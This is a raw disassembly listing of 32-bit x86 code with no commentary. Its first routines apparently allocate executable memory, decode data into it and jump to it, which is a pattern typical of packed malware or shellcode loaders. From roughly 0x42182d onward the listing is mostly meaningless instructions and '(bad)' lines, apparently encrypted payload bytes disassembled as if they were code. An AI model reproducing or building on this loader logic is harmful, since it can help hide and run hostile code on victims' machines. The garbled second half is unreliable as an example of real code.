  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x6ec62066
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0xbf161b23
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	(bad)  
  42182e:	call   0x8b6a5210
  421833:	mov    bl,0x0
  421835:	sub    eax,0xbf3c01dc
  42183a:	popf   
  42183b:	pop    edx
  42183c:	xchg   DWORD PTR [ecx+0xb38890],ebp
  421842:	sub    eax,0xff3c01d8
  421847:	bound  esp,QWORD PTR [ebp-0x77d75679]
  42184d:	mov    bl,0x0
  42184f:	sub    eax,0xbf3c01d8
  421854:	bound  esp,QWORD PTR [ebp-0x77d75679]
  42185a:	mov    bl,0x0
  42185c:	sub    eax,0xbf3c01d8
  421861:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421867:	mov    bl,0x0
  421869:	sub    eax,0xbf3c0120
  42186e:	ins    BYTE PTR es:[edi],dx
  42186f:	mov    edx,0x3c28a73d
  421874:	mov    edx,0x600ccd
  421879:	jo     0x4218ed
  42187b:	inc    ebx
  42187c:	icebp  
  42187d:	out    dx,eax
  42187e:	rcr    BYTE PTR [ebx-0x58],0xc3
  421882:	jb     0x4218c6
  421884:	mov    edi,0x42d25d73
  421889:	(bad)  
  42188a:	out    0xc7,al
  42188c:	inc    esi
  42188d:	out    0xc7,eax
  42188f:	and    BYTE PTR [edi-0x43],cl
  421892:	and    DWORD PTR [esi-0x36],ecx
  421895:	or     al,0x85
  421897:	out    dx,al
  421898:	(bad)  
  421899:	or     ah,cl
  42189b:	cld    
  42189c:	push   ebx
  42189d:	or     eax,0xda586eb5
  4218a2:	dec    esp
  4218a3:	test   al,0x8a
  4218a5:	mov    ds:0xb3880c,eax
  4218aa:	sub    eax,0xb83c01d8
  4218af:	sti    
  4218b0:	pop    ecx
  4218b1:	fsubp  st(2),st
  4218b3:	rcr    BYTE PTR [edx],1
  4218b5:	mov    ecx,0xb4ad543
  4218ba:	jg     0x421903
  4218bc:	lock scas eax,DWORD PTR es:[edi]
  4218be:	(bad)  
  4218c0:	and    al,0x82
  4218c2:	in     al,dx
  4218c3:	clc    
  4218c4:	mov    edi,0x875959d2
  4218c9:	push   0x223b7f67
  4218ce:	rcl    dh,1
  4218d0:	cmp    DWORD PTR [edi],esp
  4218d2:	mov    al,0xf9
  4218d4:	scas   al,BYTE PTR es:[edi]
  4218d5:	mov    ch,0x4e
  4218d7:	sub    edi,DWORD PTR [esi+0x21706ea3]
  4218dd:	or     ah,BYTE PTR [edi+0x58]
  4218e0:	adc    BYTE PTR [esi],dh
  4218e2:	cmc    
  4218e3:	call   0xb989:0xa8e38d37
  4218ea:	pop    eax
  4218eb:	aad    0x4a
  4218ed:	or     edi,DWORD PTR [edi+0x47]
  4218f0:	icebp  
  4218f1:	scas   eax,DWORD PTR es:[edi]
  4218f2:	scas   eax,DWORD PTR es:[edi]
  4218f3:	push   eax
  4218f4:	mov    edx,0xadd80c82
  4218f9:	ror    BYTE PTR [esp+eax*8+0x2d],cl
  4218fd:	push   0x2294e2fd
  421902:	or     BYTE PTR [ebx-0x6e],0x27
  421906:	and    BYTE PTR [esp+esi*1-0x4b],0x20
  42190b:	pop    ebp
  42190c:	adc    eax,0xbced70a3
  421911:	or     ch,BYTE PTR [edi+0x20]
  421914:	xchg   ebx,eax
  421915:	ss in  eax,dx
  421917:	or     eax,esi
  421919:	out    dx,eax
  42191a:	jmp    0xd82d:0xb91ad0
  421921:	add    DWORD PTR [edi+edi*4],edi
  421924:	bound  esp,QWORD PTR [ebp-0x77d71329]
  42192a:	inc    DWORD PTR [ecx]
  42192c:	das    
  42192d:	fsub   DWORD PTR [ecx-0x5ad22b14]
  421933:	xchg   DWORD PTR [ecx+0xb38828],ebp
  421939:	sub    eax,0xbe3f0138
  42193e:	imul   esp,DWORD PTR [ebp+ecx*4-0x4899d757],0x7642d00
  421949:	cmp    al,0xbf
  42194b:	bound  esp,QWORD PTR [ebp-0x776a4779]
  421951:	mov    bl,0x0
  421953:	cmp    eax,0xbf3c01d8
  421958:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42195a:	xchg   DWORD PTR [ecx+0x10b38869],ebp
  421960:	sub    eax,0xbf3e01d8
  421965:	bound  esp,QWORD PTR [eax-0x77d75779]
  42196b:	mov    bl,0x0
  42196d:	sub    eax,0xbf3d01dd
  421972:	bound  esp,QWORD PTR [ebp-0x27d75679]
  421978:	mov    edi,0x1dc2d00
  42197d:	cmp    al,0xbe
  42197f:	xchg   BYTE PTR [eax-0x77d75479],ah
  421985:	xor    eax,DWORD PTR [eax]
  421987:	sub    eax,0xaf3c01c8
  42198c:	bound  esp,QWORD PTR [ebp-0x77c75679]
  421992:	mov    bl,0x10
  421994:	sub    eax,0xbf3c01d8
  421999:	bound  esi,QWORD PTR [ebp-0x77d75679]
  42199f:	mov    bl,0x0
  4219a1:	sub    eax,0xbf3c01d8
  4219a6:	xchg   esi,eax
  4219a7:	pushf  
  4219a8:	mov    ebp,DWORD PTR [ecx+0xb38b41]
  4219ae:	sub    eax,0xf03c0a28
  4219b3:	sub    esp,DWORD PTR [ebp-0x77d75679]
  4219b9:	mov    bl,0x0
  4219bb:	sub    eax,0xbf3c01d8
  4219c0:	bound  esp,QWORD PTR [ebp-0x77d75679]
  4219c6:	mov    bl,0x0
  4219c8:	sub    eax,0xbf3c01d8
  4219cd:	bound  esp,QWORD PTR [ebp-0x77d75679]
  4219d3:	mov    bl,0x0
  4219d5:	sub    eax,0xbf3c01d8
  4219da:	bound  esp,QWORD PTR [ebp-0x77d75679]
  4219e0:	mov    bl,0x0
  4219e2:	sub    eax,0xbf3c01d8
  4219e7:	bound  esp,QWORD PTR [ebp-0x77d75679]
  4219ed:	mov    bl,0x0
  4219ef:	sub    eax,0xbf3c01d8
  4219f4:	bound  esp,QWORD PTR [ebp-0x77d75679]
  4219fa:	mov    bl,0x0
  4219fc:	sub    eax,0xbf3c01d8
  421a01:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421a07:	mov    bl,0x0
  421a09:	sub    eax,0xbf3c01d8
  421a0e:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421a14:	mov    bl,0x0
  421a16:	sub    eax,0xbf3c01d8
  421a1b:	bound  esp,QWORD PTR [ebp-0x12a37879]
  421a21:	retf   
  421a22:	je     0x421a51
  421a24:	fadd   DWORD PTR [ecx]
  421a26:	cmp    al,0x5f
  421a28:	imul   esp,DWORD PTR [ebp-0x77d74679],0xd829d4b3
  421a32:	add    DWORD PTR [eax],edi
  421a34:	mov    edi,0xeac2f562
  421a39:	sbb    bl,ah
  421a3b:	cld    
  421a3c:	add    BYTE PTR ds:0xbf3c01d8,ch
  421a42:	inc    edx
  421a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a44:	xchg   DWORD PTR [ecx+0x6],ecx
  421a47:	cli    
  421a48:	shl    BYTE PTR [edx+0x4e],0xd8
  421a4c:	add    DWORD PTR [edi+edi*4],edi
  421a4f:	add    ah,BYTE PTR [ebp-0x7c275679]
  421a55:	mov    bl,0x0
  421a57:	ja     0x421a31
  421a59:	add    DWORD PTR [edi+eiz*2],edi
  421a5c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  421a5e:	xchg   DWORD PTR [ecx+0xb38828],ebp
  421a64:	sub    eax,0xbf3c01d8
  421a69:	bound  eax,QWORD PTR [ebp-0x77375679]
  421a6f:	mov    bl,0x0
  421a71:	sub    eax,0xbf3c01d8
  421a76:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421a7c:	mov    bl,0x0
  421a7e:	sub    eax,0xbf3c01d8
  421a83:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421a89:	mov    bl,0x0
  421a8b:	sub    eax,0xbf3c01d8
  421a90:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421a96:	mov    bl,0x0
  421a98:	sub    eax,0xbf3c01d8
  421a9d:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421aa3:	mov    bl,0x0
  421aa5:	sub    eax,0xbf3c01d8
  421aaa:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421ab0:	mov    bl,0x0
  421ab2:	sub    eax,0xbf3c01d8
  421ab7:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421abd:	mov    bl,0x0
  421abf:	sub    eax,0xbf3c01d8
  421ac4:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421aca:	mov    bl,0x0
  421acc:	sub    eax,0xbf3c01d8
  421ad1:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421ad7:	mov    bl,0x0
  421ad9:	sub    eax,0xbf3c01d8
  421ade:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421ae4:	mov    bl,0x0
  421ae6:	sub    eax,0xbf3c01d8
  421aeb:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421af1:	mov    bl,0x0
  421af3:	sub    eax,0xbf3c01d8
  421af8:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421afe:	mov    bl,0x0
  421b00:	sub    eax,0xbf3c01d8
  421b05:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b0b:	mov    bl,0x0
  421b0d:	sub    eax,0xbf3c01d8
  421b12:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b18:	mov    bl,0x0
  421b1a:	sub    eax,0xbf3c01d8
  421b1f:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b25:	mov    bl,0x0
  421b27:	sub    eax,0xbf3c01d8
  421b2c:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b32:	mov    bl,0x0
  421b34:	sub    eax,0xbf3c01d8
  421b39:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b3f:	mov    bl,0x0
  421b41:	sub    eax,0xbf3c01d8
  421b46:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b4c:	mov    bl,0x0
  421b4e:	sub    eax,0xbf3c01d8
  421b53:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b59:	mov    bl,0x0
  421b5b:	sub    eax,0xbf3c01d8
  421b60:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b66:	mov    bl,0x0
  421b68:	sub    eax,0xbf3c01d8
  421b6d:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b73:	mov    bl,0x0
  421b75:	sub    eax,0xbf3c01d8
  421b7a:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b80:	mov    bl,0x0
  421b82:	sub    eax,0xbf3c01d8
  421b87:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b8d:	mov    bl,0x0
  421b8f:	sub    eax,0xbf3c01d8
  421b94:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421b9a:	mov    bl,0x0
  421b9c:	sub    eax,0xbf3c01d8
  421ba1:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421ba7:	mov    bl,0x0
  421ba9:	sub    eax,0xbf3c01d8
  421bae:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421bb4:	mov    bl,0x0
  421bb6:	sub    eax,0xbf3c01d8
  421bbb:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421bc1:	mov    bl,0x0
  421bc3:	sub    eax,0xbf3c01d8
  421bc8:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421bce:	mov    bl,0x0
  421bd0:	sub    eax,0xbf3c01d8
  421bd5:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421bdb:	mov    bl,0x0
  421bdd:	sub    eax,0xbf3c01d8
  421be2:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421be8:	mov    bl,0x0
  421bea:	sub    eax,0xbf3c01d8
  421bef:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421bf5:	mov    bl,0x0
  421bf7:	sub    eax,0xbf3c01d8
  421bfc:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421c02:	mov    bl,0x0
  421c04:	sub    eax,0xbf3c01d8
  421c09:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421c0f:	mov    bl,0x0
  421c11:	sub    eax,0xbf3c01d8
  421c16:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421c1c:	mov    bl,0x0
  421c1e:	sub    eax,0xbf3c01d8
  421c23:	bound  esp,QWORD PTR [ebp-0x77d75679]
  421c29:	mov    bl,0x0
  421c2b:	sub    eax,0x175301d8
  421c30:	imul   esp,DWORD PTR [ebp-0x67d75658],0x7a0700b3
  421c3a:	fisttp DWORD PTR [ebp-0x27]
  421c3d:	popf   
  421c3e:	mov    BYTE PTR [ecx],bl
  421c40:	cs js  0x421ca8
  421c43:	test   eax,ebp
  421c45:	ds ins BYTE PTR es:[edi],dx
  421c47:	xchg   esp,eax
  421c48:	pop    edx
  421c49:	into   
  421c4a:	out    0xff,al
  421c4c:	xchg   esp,eax
  421c4d:	sbb    BYTE PTR [edi-0x581b2162],bl
  421c53:	pop    ecx
  421c54:	(bad)  
  421c55:	adc    bl,ch
  421c57:	repnz call 0x22a4:0x39679abe
  421c5f:	sub    eax,0xeab4a6ff
  421c64:	xor    ecx,eax
  421c66:	cs fwait
  421c68:	adc    eax,0x4db1a755
  421c6d:	xlat   BYTE PTR ds:[ebx]
  421c6e:	fistp  WORD PTR [eax]
  421c70:	add    al,0x2e
  421c72:	jbe    0x421cb6
  421c74:	xchg   al,dl
  421c76:	push   ss
  421c77:	mov    ecx,0xa2f849ef
  421c7c:	xor    ecx,DWORD PTR [esi-0x38]
  421c7f:	mov    dl,al
  421c81:	shr    DWORD PTR [esi-0x27],1
  421c84:	lock into 
  421c86:	pushf  
  421c87:	sahf   
  421c88:	sub    BYTE PTR [ecx+0x22],al
  421c8b:	jecxz  0x421c8c
  421c8d:	gs scas al,BYTE PTR es:[edi]
  421c8f:	pushf  
  421c90:	or     al,BYTE PTR [eax-0xe063695]
  421c96:	pop    ebp
  421c97:	xor    al,0x2
  421c99:	add    edx,DWORD PTR [ebx-0x64dc307b]
  421c9f:	dec    ebx
  421ca0:	retf   0xa1e7
  421ca3:	daa    
  421ca4:	loopne 0x421c76
  421ca6:	pop    ds
  421ca7:	rcl    DWORD PTR ds:0x2ef1a153,0xd2
  421cae:	jmp    0x6d4b0ce3
  421cb3:	retf   
  421cb4:	and    eax,0xb9a595f7
  421cb9:	inc    ebp
  421cba:	jmp    0x8cf5650c
  421cbf:	push   es
  421cc0:	mov    dh,0xf3
  421cc2:	cs add dl,cl
  421cc5:	out    dx,eax
  421cc6:	xchg   BYTE PTR [eax+0x3336f3f5],dl
  421ccc:	xor    edi,DWORD PTR [ebp-0x3d7850cc]
  421cd2:	inc    ebx
  421cd3:	sbb    ah,BYTE PTR [eax+ebx*4-0x2b6cdbb2]
  421cda:	dec    edi
  421cdb:	aas    
  421cdc:	rol    DWORD PTR [esi+ebx*1],cl
  421cdf:	inc    edx
  421ce0:	pop    DWORD PTR [edi-0x18]
  421ce3:	adc    al,0x16
  421ce5:	mov    eax,0x1975ce17
  421cea:	push   ss
  421ceb:	sbb    dh,BYTE PTR [eax-0x35]
  421cee:	rcl    ecx,1
  421cf0:	pop    ds
  421cf1:	mov    esi,0xa411bf7d
  421cf6:	inc    esi
  421cf7:	xchg   DWORD PTR [edi+0x62],edx
  421cfa:	pop    DWORD PTR ds:0x2be0cf8e
  421d00:	jne    0x421ce1
  421d02:	mov    edx,0x47cf265f
  421d07:	mov    al,ds:0x81ac533e
  421d0c:	sub    dl,ch
  421d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d0f:	fiadd  DWORD PTR [ecx-0x21]
  421d12:	lock mov eax,ds:0xff3e3f4c
  421d18:	shr    edi,cl
  421d1a:	xchg   edx,eax
  421d1b:	sub    eax,0x7c3942f6
  421d20:	outs   dx,DWORD PTR ds:[esi]
  421d21:	loope  0x421d30
  421d23:	mov    edx,0x1f9b25dd
  421d28:	out    dx,eax
  421d29:	outs   dx,BYTE PTR ds:[esi]
  421d2a:	xchg   ebp,eax
  421d2b:	stos   DWORD PTR es:[edi],eax
  421d2c:	push   eax
  421d2d:	mov    BYTE PTR [ebx],dh
  421d2f:	jle    0x421d8f
  421d31:	ins    DWORD PTR es:[edi],dx
  421d32:	jmp    0x421d7c
  421d34:	(bad)  
  421d35:	adc    DWORD PTR [ecx],eax
  421d37:	add    esi,DWORD PTR [esi]
  421d39:	ret    
  421d3a:	jp     0x421cda
  421d3c:	ins    BYTE PTR es:[edi],dx
  421d3d:	sbb    BYTE PTR [edi],ah
  421d3f:	repnz sbb bl,dl
  421d42:	push   es
  421d43:	stc    
  421d44:	or     eax,0xf4f1872
  421d49:	xor    DWORD PTR [ebx+0x2],ebp
  421d4c:	add    BYTE PTR [esi],ah
  421d4e:	push   ds
  421d4f:	call   0x5c6a4e06
  421d54:	mov    dl,0x69
  421d56:	jbe    0x421d67
  421d58:	lock stos DWORD PTR es:[edi],eax
  421d5a:	mov    al,0xe7
  421d5c:	fild   WORD PTR [ebx+0x68]
  421d5f:	sbb    DWORD PTR [ebx+0x39],esi
  421d62:	(bad)  
  421d63:	test   al,0x99
  421d65:	jo     0x421d42
  421d67:	xchg   ecx,eax
  421d68:	mov    eax,0xd11876e2
  421d6d:	sub    DWORD PTR [edx-0xa9dd732],esp
  421d73:	dec    ecx
  421d74:	icebp  
  421d75:	scas   al,BYTE PTR es:[edi]
  421d76:	xchg   ecx,eax
  421d77:	push   edx
  421d78:	(bad)  
  421d79:	clc    
  421d7a:	test   BYTE PTR [edi+0x4c],0x87
  421d7e:	jmp    0x5a8f7310
  421d83:	mov    bh,dl
  421d85:	push   cs
  421d86:	mov    bl,0x86
  421d88:	popf   
  421d89:	xor    BYTE PTR [ebp-0x54dc234d],al
  421d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d90:	jmp    0xe1356a38
  421d95:	mov    esp,0x189fbf5f
  421d9a:	(bad)  
  421d9b:	jmp    0xe5ee:0x80442964
  421da2:	les    esi,FWORD PTR [ecx-0x696298b2]
  421da8:	cmp    DWORD PTR [esi+0x5e97cce8],esp
  421dae:	sub    DWORD PTR [edi+0x7e],esi
  421db1:	js     0x421daf
  421db3:	push   esi
  421db4:	push   0x272c6c92
  421db9:	xor    al,0x74
  421dbb:	and    ah,BYTE PTR [edx+0x9]
  421dbe:	sub    esi,esi
  421dc0:	jb     0x421d45
  421dc2:	inc    ecx
  421dc3:	adc    ch,ch
  421dc5:	clc    
  421dc6:	pop    ds
  421dc7:	mov    ecx,0x25b7e7c6
  421dcc:	test   al,0x73
  421dce:	sti    
  421dcf:	stc    
  421dd0:	xchg   si,di
  421dd3:	add    cl,BYTE PTR [edx]
  421dd5:	jmp    0x421d81
  421dd7:	sub    dl,BYTE PTR [eax]
  421dd9:	aaa    
  421dda:	out    0x42,eax
  421ddc:	push   es
  421ddd:	or     esp,DWORD PTR [edi]
  421ddf:	mov    esp,gs
  421de1:	dec    esi
  421de2:	stc    
  421de3:	xor    eax,0xa0b1d292
  421de8:	inc    esi
  421de9:	push   ebx
  421dea:	mov    ah,0x87
  421dec:	int3   
  421ded:	aam    0xba
  421def:	jmp    0x246563a0
  421df4:	or     al,0x94
  421df6:	and    eax,ebp
  421df8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421df9:	ret    0x5039
  421dfc:	mov    dh,ah
  421dfe:	imul   ebp,DWORD PTR [edx+0x211dd71c],0x3f8028b9
  421e08:	repnz aas 
  421e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e0b:	push   eax
  421e0c:	mov    dh,0x67
  421e0e:	xlat   BYTE PTR ds:[ebx]
  421e0f:	mov    eax,ds:0x3dcd0cbb
  421e14:	ret    
  421e15:	rcl    dl,0xcf
  421e18:	fdiv   DWORD PTR [edi-0x63]
  421e1b:	hlt    
  421e1c:	mov    ebp,0x7e963120
  421e21:	sbb    BYTE PTR [ebx-0x1d2ac03c],al
  421e27:	stos   DWORD PTR es:[edi],eax
  421e28:	ret    
  421e29:	inc    ebp
  421e2a:	xchg   edi,eax
  421e2b:	sub    BYTE PTR [eax+0x46a4346a],0x62
  421e32:	jnp    0x421e93
  421e34:	push   eax
  421e35:	jns    0x421deb
  421e37:	jae    0x421dd2
  421e39:	pushf  
  421e3a:	dec    esi
  421e3b:	sub    ebp,ecx
  421e3d:	mov    ebx,ecx
  421e3f:	hlt    
  421e40:	popa   
  421e41:	adc    eax,0x5b790f1e
  421e46:	mov    esp,0xeebb52d
  421e4b:	jns    0x421ddc
  421e4d:	xchg   ecx,eax
  421e4e:	shr    DWORD PTR ds:0xebcdae2e,cl
  421e54:	ret    0x631
  421e57:	fsubr  QWORD PTR [esi+0x4d]
  421e5a:	sbb    DWORD PTR [ebx+0x6efcdd1f],ebp
  421e60:	(bad)  
  421e61:	addr16 mov ch,0x9e
  421e64:	stos   BYTE PTR es:[edi],al
  421e65:	xchg   esp,eax
  421e66:	cmp    BYTE PTR [ebx],dh
  421e68:	push   edi
  421e69:	inc    eax
  421e6a:	sbb    ah,0x16
  421e6d:	mov    eax,0x1ffe9d0e
  421e72:	ins    BYTE PTR es:[edi],dx
  421e73:	pop    edi
  421e74:	ds retf 0xea47
  421e78:	mov    ds:0x40d661b3,al
  421e7d:	mov    ebp,ecx
  421e7f:	mov    eax,DWORD PTR [esi]
  421e81:	and    ah,BYTE PTR [ebx+0x16997caa]
  421e87:	jl     0x421e68
  421e89:	or     dh,BYTE PTR [ebx]
  421e8b:	retf   0x56b2
  421e8e:	icebp  
  421e8f:	aam    0x5e
  421e91:	lods   eax,DWORD PTR ds:[esi]
  421e92:	(bad)
  421e96:	xchg   esp,eax
